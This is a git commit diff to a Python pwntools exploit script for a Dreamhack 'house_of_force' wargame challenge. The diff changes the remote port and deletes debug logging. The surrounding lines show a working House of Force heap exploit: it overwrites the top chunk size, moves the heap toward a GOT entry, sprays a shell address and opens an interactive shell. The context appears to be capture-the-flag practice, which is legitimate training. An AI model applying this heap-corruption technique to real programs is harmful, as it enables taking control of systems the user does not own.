7143b04c0a01665b4764945e90b606a7c787f035
Your Name <you@example.com>
2020-12-06 12:40:03 -0800

    t

--- dreamhack/house_of_force/ex.py
+++ dreamhack/house_of_force/ex.py
@@ -12,7 +12,7 @@ def Write(idx, offset, value):
     p.sendlineafter(': ', str(value))
     
 #p = process('house_of_force')
-p = remote('host1.dreamhack.games', 19605)
+p = remote('host1.dreamhack.games', 11263)
 _recv = Create(8, 'a'*8)
 addr_heap = int(_recv.split(': ')[0], 16)
 addr_firstChunk = addr_heap + 0x10
@@ -26,10 +26,6 @@ size_exploit = size_exploit - 8 if size_exploit % 8 == 0 else size_exploit - 8 +
 addr_calc = addr_firstChunk + size_exploit + 8
 Write(0, 12/4, 0xffffffff)
 Create(size_exploit, 'a')
-log.info('exploit size: ' + hex(size_exploit))
-log.info('heap: ' + hex(addr_heap))
-log.info('got: ' + hex(addr_got))
-log.info('calculated address: ' + hex(addr_calc))
 Create(4*50, p32(addr_shell)*((addr_target - addr_calc)/4 + 1) + '\x00')
 p.interactive()
 
